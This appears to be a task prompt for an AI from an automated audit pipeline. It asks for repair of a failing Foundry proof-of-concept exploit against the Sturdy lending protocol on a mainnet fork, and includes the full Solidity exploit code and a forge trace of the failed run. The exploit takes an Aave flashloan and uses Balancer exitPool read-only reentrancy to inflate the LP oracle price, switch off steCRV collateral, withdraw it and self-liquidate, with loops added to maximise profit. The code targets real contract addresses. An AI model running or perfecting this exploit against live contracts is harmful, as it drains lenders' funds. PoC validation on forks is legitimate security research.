You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Transient Balancer `exitPool` state can inflate Balancer-LP collateral prices and bypass collateral-removal solvency checks
- claim: The PoC and verifier show that `SturdyOracle.getAssetPrice(cB_stETH_STABLE)` is materially higher from inside the ETH payout callback of `Balancer.exitPool(...)` than it is immediately before or after the exit. That same callback can invoke lending-pool entrypoints, and the exploit uses it to call `setUserUseReserveAsCollateral(CSTECRV, false)` while solvency checks observe the transiently inflated Balancer-LP price rather than a finalized pool state. Once `steCRV` has been switched off during that fake-health window, it can then be withdrawn after the LP price normalizes.
- impact: An attacker can temporarily overvalue Balancer LP collateral inside one transaction, make an unsafe account appear healthy, disable honest collateral, and then withdraw that honest collateral after prices revert. The included forked exploit completes this sequence and extracts substantial profit, so the issue is directly fund-threatening.
- exploit_paths: ["Flash-loan `wstETH` and `WETH`, mint `B_STETH_STABLE`, and deposit both `B_STETH_STABLE` and `steCRV` as collateral before borrowing `WETH`.", "Call `Balancer.exitPool(...)`; during the first ETH callback, read the inflated `cB_stETH_STABLE` oracle price and call `setUserUseReserveAsCollateral(CSTECRV, false)` while solvency checks use the transient price.", "After control returns and the oracle price normalizes, call `withdrawCollateral(steCRV, ...)` to remove the real collateral and leave the debt backed only by the previously overvalued LP position."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IwstETH is IERC20 {
    function unwrap(uint256 amount) external returns (uint256);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 minMintAmount) external payable returns (uint256);
    function remove_liquidity_one_coin(uint256 tokenAmount, int128 i, uint256 minAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external payable;
}

interface IBalancerVault {
    struct JoinPoolRequest {
        address[] assets;
        uint256[] maxAmountsIn;
        bytes userData;
        bool fromInternalBalance;
    }

    struct ExitPoolRequest {
        address[] assets;
        uint256[] minAmountsOut;
        bytes userData;
        bool toInternalBalance;
    }

    function joinPool(bytes32 poolId, address sender, address recipient, JoinPoolRequest memory request) external payable;
    function exitPool(bytes32 poolId, address sender, address payable recipient, ExitPoolRequest memory request) external payable;
}

interface IBalancerQueries {
    function queryJoin(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.JoinPoolRequest memory request
    ) external returns (uint256 bptOut, uint256[] memory amountsIn);

    function queryExit(
        bytes32 poolId,
        address sender,
        address recipient,
        IBalancerVault.ExitPoolRequest memory request
    ) external returns (uint256 bptIn, uint256[] memory amountsOut);
}

interface IMetaStablePool is IERC20 {
    function getPoolId() external view returns (bytes32);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ILendingPool {
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );

    function liquidationCall(address collateralAsset, address debtAsset, address user, uint256 debtToCover, bool receiveAToken)
        external;

    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
}

interface ILPVault {
    function depositCollateralFrom(address asset, uint256 amount, address user) external payable;
    function withdrawCollateral(address asset, uint256 amount, uint256 slippage, address to) external;
}

interface ISturdyOracle {
    function getAssetPrice(address asset) external view returns (uint256);
}

error NoFeasibleRounds(bytes reason);
error SimulationResult(
    uint8 rounds,
    uint256 netProfitWeth,
    uint256 beforePrice,
    uint256 duringPrice,
    uint256 afterPrice,
    bool hypothesisValidated
);

contract FlawVerifier {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IAaveFlashloan internal constant AAVE_V3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);

    uint256 internal constant FLASHLOAN_WSTETH = 50_000 ether;
    uint256 internal constant FLASHLOAN_WETH = 60_000 ether;
    uint256 internal constant STECRV_SEED_ETH = 1_100 ether;

    uint256 internal _profitAmount;
    uint256 public oraclePriceBeforeExit;
    uint256 public oraclePriceDuringCallback;
    uint256 public oraclePriceAfterExit;
    uint8 public bestRoundCount;
    bool public hypothesisValidated;
    bool public attempted;
    bool public executionSucceeded;
    address public activeLeg;
    bytes public failureData;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = FLASHLOAN_WSTETH;
        amounts[1] = FLASHLOAN_WETH;

        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        try AAVE_V3.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0) {
            executionSucceeded = true;
        } catch (bytes memory reason) {
            failureData = reason;
            executionSucceeded = false;
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        _profitAmount = WETH.balanceOf(address(this));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_V3), "not-aave");

        _mintSteCrvSeed();

        ExploitLeg leg = new ExploitLeg(address(this));
        activeLeg = address(leg);
        _approveLeg(address(leg));

        uint256 repayWstEth = amounts[0] + premiums[0];
        uint256 repayWeth = amounts[1] + premiums[1];

        (uint8 rounds, bytes memory lastFailure) = _selectBestRoundCount(leg, repayWstEth, repayWeth);
        if (rounds == 0) {
            activeLeg = address(0);
            revert NoFeasibleRounds(lastFailure);
        }

        bestRoundCount = rounds;
        leg.executePath(rounds, repayWstEth, repayWeth, false);

        require(IERC20(assets[0]).approve(address(AAVE_V3), repayWstEth), "approve-wsteth");
        require(IERC20(assets[1]).approve(address(AAVE_V3), repayWeth), "approve-weth");
        return true;
    }

    function _mintSteCrvSeed() internal {
        WETH.withdraw(STECRV_SEED_ETH);

        uint256[2] memory curveAmounts;
        curveAmounts[0] = STECRV_SEED_ETH;
        curveAmounts[1] = 0;
        LIDO_CURVE_POOL.add_liquidity{value: STECRV_SEED_ETH}(curveAmounts, 1_000 ether);
    }

    function _approveLeg(address leg) internal {
        require(WETH.approve(leg, type(uint256).max), "approve-leg-weth");
        require(WSTETH.approve(leg, type(uint256).max), "approve-leg-wsteth");
        require(STECRV.approve(leg, type(uint256).max), "approve-leg-stecrv");
    }

    function _selectBestRoundCount(ExploitLeg leg, uint256 repayWstEth, uint256 repayWeth)
        internal
        returns (uint8 bestRounds, bytes memory lastFailure)
    {
        uint256 bestProfit;
        bool hasBest;

        for (uint8 rounds = 2; rounds <= 6; ++rounds) {
            (bool feasible, uint256 profit, bytes memory failure) = _simulateRounds(leg, rounds, repayWstEth, repayWeth);
            if (!feasible) {
                lastFailure = failure;
                if (!hasBest) {
                    return (0, lastFailure);
                }
                break;
            }

            if (!hasBest) {
                hasBest = true;
                bestRounds = rounds;
                bestProfit = profit;
                continue;
            }

            if (profit > bestProfit) {
                bestRounds = rounds;
                bestProfit = profit;
                continue;
            }

            break;
        }
    }

    function _simulateRounds(ExploitLeg leg, uint8 rounds, uint256 repayWstEth, uint256 repayWeth)
        internal
        returns (bool feasible, uint256 profit, bytes memory failure)
    {
        try leg.executePath(rounds, repayWstEth, repayWeth, true) {
            failure = abi.encodePacked("simulation-did-not-revert");
        } catch (bytes memory reason) {
            if (_selector(reason) == SimulationResult.selector) {
                (, profit,, , ,) = abi.decode(_tail(reason), (uint8, uint256, uint256, uint256, uint256, bool));
                feasible = true;
                return (feasible, profit, bytes(""));
            }
            failure = reason;
        }
    }

    function _selector(bytes memory data) internal pure returns (bytes4 value) {
        if (data.length < 4) {
            return bytes4(0);
        }
        assembly {
            value := mload(add(data, 32))
        }
    }

    function _tail(bytes memory data) internal pure returns (bytes memory out) {
        if (data.length <= 4) {
            return bytes("");
        }

        out = new bytes(data.length - 4);
        for (uint256 i = 4; i < data.length; ++i) {
            out[i - 4] = data[i];
        }
    }

    function notifyExecution(uint256 beforePrice, uint256 duringPrice, uint256 afterPrice, bool validated) external {
        require(msg.sender == activeLeg, "only-leg");
        oraclePriceBeforeExit = beforePrice;
        oraclePriceDuringCallback = duringPrice;
        oraclePriceAfterExit = afterPrice;
        hypothesisValidated = validated;
        activeLeg = address(0);
    }

    function profitToken() external pure returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

contract ExploitLeg {
    IWETH9 internal constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwstETH internal constant WSTETH = IwstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 internal constant STECRV = IERC20(0x06325440D014e39736583c165C2963BA99fAf14E);
    IERC20 internal constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IMetaStablePool internal constant B_STETH_STABLE = IMetaStablePool(0x32296969Ef14EB0c6d29669C550D4a0449130230);
    ILendingPool internal constant LENDING_POOL = ILendingPool(0x9f72DC67ceC672bB99e3d02CbEA0a21536a2b657);
    ILPVault internal constant AURA_BALANCER_LP_VAULT = ILPVault(0x6AE5Fd07c0Bb2264B1F60b33F65920A2b912151C);
    ILPVault internal constant CONVEX_CURVE_LP_VAULT = ILPVault(0xa36BE47700C079BD94adC09f35B0FA93A55297bc);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBalancerQueries internal constant BALANCER_QUERIES = IBalancerQueries(0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5);
    ISturdyOracle internal constant STURDY_ORACLE = ISturdyOracle(0xe5d78eB340627B8D5bcFf63590Ebec1EF9118C89);
    ICurvePool internal constant LIDO_CURVE_POOL = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);

    address internal constant CB_STETH_STABLE = 0x10aA9eea35A3102Cc47d4d93Bc0BA9aE45557746;
    address internal constant CSTECRV = 0x901247D08BEbFD449526Da92941B35D756873Bcd;

    uint256 internal constant JOIN_WSTETH_AMOUNT = 50_000 ether;
    uint256 internal constant JOIN_WETH_AMOUNT = 57_000 ether;
    uint256 internal constant STECRV_COLLATERAL_AMOUNT = 1_000 ether;
    uint256 internal constant BPT_COLLATERAL_AMOUNT = 233_348_773_557_117_598_739;
    uint256 internal constant BORROW_WETH_AMOUNT = 513_367_301_825_658_717_226;

    address internal immutable owner;
    bool internal exitInProgress;
    bool internal callbackUsed;
    uint256 internal priceBeforeExit;
    uint256 internal priceDuringCallback;
    uint256 internal priceAfterExit;

    constructor(address owner_) {
        owner = owner_;
    }

    function executePath(uint8 rounds, uint256 repayWstEth, uint256 repayWeth, bool simulate) external {
        require(msg.sender == owner, "only-owner");

        _pullCapital();

        for (uint8 round = 0; round < rounds; ++round) {
            _runSingleRound();
        }

        _convertResidualsToSettlement(repayWstEth);
        uint256 netProfit = _validateSettlement(repayWstEth, repayWeth);
        bool validated = priceDuringCallback > priceBeforeExit && priceDuringCallback > priceAfterExit;

        if (simulate) {
            revert SimulationResult(rounds, netProfit, priceBeforeExit, priceDuringCallback, priceAfterExit, validated);
        }

        FlawVerifier(payable(owner)).notifyExecution(priceBeforeExit, priceDuringCallback, priceAfterExit, validated);

        require(WSTETH.transfer(owner, WSTETH.balanceOf(address(this))), "return-wsteth");
        require(WETH.transfer(owner, WETH.balanceOf(address(this))), "return-weth");

        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            require(STECRV.transfer(owner, steCrvBalance), "return-stecrv");
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.transfer(owner, stEthBalance), "return-steth");
        }
    }

    function _pullCapital() internal {
        uint256 wethBalance = WETH.balanceOf(owner);
        if (wethBalance != 0) {
            require(WETH.transferFrom(owner, address(this), wethBalance), "pull-weth");
        }

        uint256 wstEthBalance = WSTETH.balanceOf(owner);
        if (wstEthBalance != 0) {
            require(WSTETH.transferFrom(owner, address(this), wstEthBalance), "pull-wsteth");
        }

        uint256 steCrvBalance = STECRV.balanceOf(owner);
        if (steCrvBalance != 0) {
            require(STECRV.transferFrom(owner, address(this), steCrvBalance), "pull-stecrv");
        }
    }

    function _runSingleRound() internal {
        _joinBalancerPool();
        _depositCollateralAndBorrow();
        _exitBalancerPoolAndDisableSteCrv();
        _withdrawCollateralThenLiquidate();
        _removeBalancerPoolLiquidity();
    }

    function _joinBalancerPool() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.JoinPoolRequest memory request = _buildJoinRequest(0);
        (uint256 bptOut,) = BALANCER_QUERIES.queryJoin(poolId, address(this), address(this), request);

        require(WSTETH.approve(address(BALANCER), JOIN_WSTETH_AMOUNT), "approve-join-wsteth");
        require(WETH.approve(address(BALANCER), JOIN_WETH_AMOUNT), "approve-join-weth");

        request = _buildJoinRequest(bptOut);
        BALANCER.joinPool(poolId, address(this), address(this), request);
    }

    function _depositCollateralAndBorrow() internal {
        require(STECRV.approve(address(CONVEX_CURVE_LP_VAULT), STECRV_COLLATERAL_AMOUNT), "approve-stecrv-vault");
        CONVEX_CURVE_LP_VAULT.depositCollateralFrom(address(STECRV), STECRV_COLLATERAL_AMOUNT, address(this));

        require(B_STETH_STABLE.approve(address(AURA_BALANCER_LP_VAULT), BPT_COLLATERAL_AMOUNT), "approve-bpt-vault");
        AURA_BALANCER_LP_VAULT.depositCollateralFrom(address(B_STETH_STABLE), BPT_COLLATERAL_AMOUNT, address(this));

        LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, true);
        LENDING_POOL.setUserUseReserveAsCollateral(CB_STETH_STABLE, true);
        LENDING_POOL.borrow(address(WETH), BORROW_WETH_AMOUNT, 2, 0, address(this));
    }

    function _exitBalancerPoolAndDisableSteCrv() internal {
        bytes32 poolId = B_STETH_STABLE.getPoolId();
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-exit-bpt");

        callbackUsed = false;
        priceBeforeExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
        exitInProgress = true;
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
        exitInProgress = false;
        priceAfterExit = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
    }

    function _withdrawCollateralThenLiquidate() internal {
        CONVEX_CURVE_LP_VAULT.withdrawCollateral(address(STECRV), STECRV_COLLATERAL_AMOUNT, 10, address(this));

        (, uint256 totalDebt,,,,) = LENDING_POOL.getUserAccountData(address(this));
        require(WETH.approve(address(LENDING_POOL), totalDebt), "approve-liquidation");
        LENDING_POOL.liquidationCall(address(B_STETH_STABLE), address(WETH), address(this), totalDebt, false);
    }

    function _removeBalancerPoolLiquidity() internal {
        uint256 bptBalance = B_STETH_STABLE.balanceOf(address(this));
        if (bptBalance == 0) {
            return;
        }

        bytes32 poolId = B_STETH_STABLE.getPoolId();
        IBalancerVault.ExitPoolRequest memory request = _buildExitRequest(bptBalance);
        BALANCER_QUERIES.queryExit(poolId, address(this), address(this), request);

        require(B_STETH_STABLE.approve(address(BALANCER), bptBalance), "approve-final-exit");
        BALANCER.exitPool(poolId, address(this), payable(address(this)), request);
    }

    function _convertResidualsToSettlement(uint256 repayWstEth) internal {
        uint256 steCrvBalance = STECRV.balanceOf(address(this));
        if (steCrvBalance != 0) {
            LIDO_CURVE_POOL.remove_liquidity_one_coin(steCrvBalance, 0, 1_000 ether);
        }

        uint256 currentWstEth = WSTETH.balanceOf(address(this));
        if (currentWstEth > repayWstEth) {
            WSTETH.unwrap(currentWstEth - repayWstEth);
        }

        uint256 stEthBalance = STETH.balanceOf(address(this));
        if (stEthBalance != 0) {
            require(STETH.approve(address(LIDO_CURVE_POOL), stEthBalance), "approve-steth-curve");
            LIDO_CURVE_POOL.exchange(1, 0, stEthBalance, 1);
        }

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }
    }

    function _validateSettlement(uint256 repayWstEth, uint256 repayWeth) internal view returns (uint256 netProfit) {
        require(WSTETH.balanceOf(address(this)) >= repayWstEth, "insufficient-wsteth-to-repay");
        uint256 wethBalance = WETH.balanceOf(address(this));
        require(wethBalance > repayWeth, "non-profitable");
        netProfit = wethBalance - repayWeth;
    }

    function _buildJoinRequest(uint256 minimumBptOut)
        internal
        pure
        returns (IBalancerVault.JoinPoolRequest memory request)
    {
        uint256[] memory maxAmountsIn = new uint256[](2);
        maxAmountsIn[0] = JOIN_WSTETH_AMOUNT;
        maxAmountsIn[1] = JOIN_WETH_AMOUNT;

        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(WETH);

        request = IBalancerVault.JoinPoolRequest({
            assets: assets,
            maxAmountsIn: maxAmountsIn,
            userData: abi.encode(uint256(1), maxAmountsIn, minimumBptOut),
            fromInternalBalance: false
        });
    }

    function _buildExitRequest(uint256 bptIn)
        internal
        pure
        returns (IBalancerVault.ExitPoolRequest memory request)
    {
        uint256[] memory minAmountsOut = new uint256[](2);
        address[] memory assets = new address[](2);
        assets[0] = address(WSTETH);
        assets[1] = address(0);

        request = IBalancerVault.ExitPoolRequest({
            assets: assets,
            minAmountsOut: minAmountsOut,
            userData: abi.encode(uint256(1), bptIn),
            toInternalBalance: false
        });
    }

    receive() external payable {
        if (exitInProgress && !callbackUsed) {
            callbackUsed = true;
            priceDuringCallback = STURDY_ORACLE.getAssetPrice(CB_STETH_STABLE);
            LENDING_POOL.setUserUseReserveAsCollateral(CSTECRV, false);
        }
    }
}

```

forge stdout (tail):
```
0000000000000000000000000200000000000000000000000000000000000000000000058d47714edc989211970000000000000000000000000000000000000000000006400428239ea532294300000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000001730f3738b66f405dab60000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000a968163f0a57b400000000000000000000000000000000000000000000000000c11f9e7b10e91a00000)
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000001730f3738b66f405dab6
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000a968163f0a57b400000000000000000000000000000000000000000000000000c11f9e7b10e91a00000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   ├─ [6080] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::transferFrom(ExploitLeg: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0xBA12222222228d8Ba445958a75a0704d566BF2C8, 50000000000000000000000 [5e22])
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000ba12222222228d8ba445958a75a0704d566bf2c8
    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000a968163f0a57b400000
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000ba12222222228d8ba445958a75a0704d566bf2c8
    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [509] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(ExploitLeg: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 0xBA12222222228d8Ba445958a75a0704d566BF2C8, 57000000000000000000000 [5.7e22])
    │   │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] NoFeasibleRounds(0x)
    │   │   │   │   └─ ← [Revert] NoFeasibleRounds(0x)
    │   │   │   └─ ← [Revert] NoFeasibleRounds(0x)
    │   │   └─ ← [Revert] NoFeasibleRounds(0x)
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [245] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [391] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17460609 [1.746e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x32296969Ef14EB0c6d29669C550D4a0449130230
  at 0x32296969Ef14EB0c6d29669C550D4a0449130230
  at 0xE39B5e3B6D74016b2F6A9673D7d7493B6DF549d5.queryJoin
  at ExploitLeg.executePath
  at FlawVerifier.executeOperation
  at 0x0A62276bFBF1Ad8443f37Da8630d407408085c8b
  at 0xF1Cd4193bbc1aD4a23E833170f49d60f3D35a621.flashLoan
  at 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.93s (356.82ms CPU time)

Ran 1 test suite in 1.94s (1.93s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 7332702)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
